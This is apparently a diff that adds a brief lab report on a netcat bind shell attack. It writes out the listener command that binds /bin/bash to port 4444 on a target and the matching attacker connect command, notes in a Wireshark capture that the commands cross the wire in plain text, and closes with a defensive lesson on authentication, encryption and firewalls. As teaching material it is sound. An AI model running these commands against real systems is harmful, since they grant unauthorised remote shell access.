@@ -1,0 +1,23 @@
+==========================================================
+      LAB REPORT: NETCAT BIND SHELL ATTACK
+==========================================================
+
+1. OBJECTIVE:
+Demonstrate how an unencrypted "Bind Shell" allows 
+remote command execution on a target system.
+
+2. COMMANDS USED:
+Target (Victim): nc -lvp 4444 -e /bin/bash
+Attacker:        nc [IP_Address] 4444
+
+3. ANALYSIS (WIRESHARK):
+- Protocol: TCP
+- Port: 4444
+- Visibility: All commands (ls, whoami, pwd) are 
+  sent in PLAIN TEXT.
+
+4. SECURITY LESSON:
+This attack is successful because there is no 
+authentication and no encryption. Firewalls should 
+block Port 4444.
+==========================================================
